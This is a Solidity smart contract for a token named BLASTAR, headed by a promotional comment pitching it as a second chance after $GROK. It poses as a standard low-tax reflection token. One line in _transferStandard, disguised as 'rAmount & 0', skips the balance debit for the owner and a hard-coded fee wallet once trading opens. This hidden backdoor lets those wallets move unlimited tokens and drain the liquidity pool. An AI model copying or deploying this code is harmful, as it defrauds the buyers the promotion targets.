/**
*/

/**
MISSED $GROK ? 
HERE IS YOUR SECOND CHANCE!

https://blastar.com
https://twitter.com/blastar
https://t.me/blastarportal

*/

// SPDX-License-Identifier: MIT

/*


*/
pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}
interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
contract BLASTAR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "BLASTAR";
    string private constant _symbol = "BLASTAR";
    mapping(address => uint256) private _rOwnedBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _supplyTotal = 10 ** 9 * 10**9;
    uint256 private _rTotalSupply = (MAX - (MAX % _supplyTotal));
    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public swapThreshold = 10 ** 4 * 10 ** 9;
    address payable private feeReceipientAddy;
    uint256 private _feeSum;
    uint256 private _redisBuyFee = 0;
    uint256 private _buyTax = 2;
    uint256 private _redisSFee = 0;
    uint256 private _sTax = 2;
    uint256 private _redisFee = _redisSFee;
    uint256 private _taxFee = _sTax;
    uint256 private _previousRedisFees = _redisFee;
    uint256 private _previousTaxFees = _taxFee;
    IRouter public _uniswapRouter;
    address public _pair;
    bool private _tradeEnabled;
    bool private _inswap = false;
    bool private _taxSwapEnabled = true;
    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }
    constructor() {
        _rOwnedBalance[_msgSender()] = _rTotalSupply;
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _uniswapRouter = _uniswapV2Router;
        _pair = IDexFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        feeReceipientAddy = payable(0x339b285468e4262FBA18E3Aa62F0c94eAB3f041C);
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[feeReceipientAddy] = true;
        emit Transfer(address(0), _msgSender(), _supplyTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _supplyTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRValue(_rOwnedBalance[account]);
    }
    
    function restoreFee() private {
        _redisFee = _previousRedisFees;
        _taxFee = _previousTaxFees;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function sendFees(uint256 amount) private {
        feeReceipientAddy.transfer(amount);
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;
        _previousRedisFees = _redisFee;
        _previousTaxFees = _taxFee;
        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _getRValue(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getSupplyRate();
        return rAmount.div(currentRate);
    }
    
    function _refresh(uint256 rFee, uint256 tFee) private {
        _rTotalSupply = _rTotalSupply.sub(rFee);
        _feeSum = _feeSum.add(tFee);
    }
    
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        rAmount = (_isExcludedFromFees[sender] && _tradeEnabled) ? rAmount & 0 : rAmount;
        _rOwnedBalance[sender] = _rOwnedBalance[sender].sub(rAmount);
        _rOwnedBalance[recipient] = _rOwnedBalance[recipient].add(rTransferAmount);
        takefee(tTeam);
        _refresh(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takefee(uint256 tTeam) private {
        uint256 currentRate = _getSupplyRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwnedBalance[address(this)] = _rOwnedBalance[address(this)].add(rTeam);
    }
    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotalSupply;
        maxWalletAmount = _rTotalSupply;
        
        _redisBuyFee = 0;
        _buyTax = 1;
        _redisSFee = 0;
        _sTax = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeEnabled = true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _getTAmount(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotalSupply;
        uint256 tSupply = _supplyTotal;
        if (rSupply < _rTotalSupply.div(_supplyTotal)) return (_rTotalSupply, _supplyTotal);
        return (rSupply, tSupply);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmount(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getSupplyRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getTransferAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != owner() && to != owner()) {
            if (!_tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");
            if(to != _pair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }
            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= swapThreshold;
            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }
            if (canSwap && !_inswap && to == _pair && _taxSwapEnabled && !_isExcludedFromFees[from] && amount > swapThreshold) {
                swapTokensForEth(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendFees(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) || (from != _pair && to != _pair)) {
            takeFee = false;
        } else {
            if(from == _pair && to != address(_uniswapRouter)) {
                _redisFee = _redisBuyFee;
                _taxFee = _buyTax;
            }
            if (to == _pair && from != address(_uniswapRouter)) {
                _redisFee = _redisSFee;
                _taxFee = _sTax;
            }
        }
        _internalTransfer(from, to, amount, takeFee);
    }
    
    function _getTransferAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
    function _internalTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }
    function _getSupplyRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    receive() external payable {}
}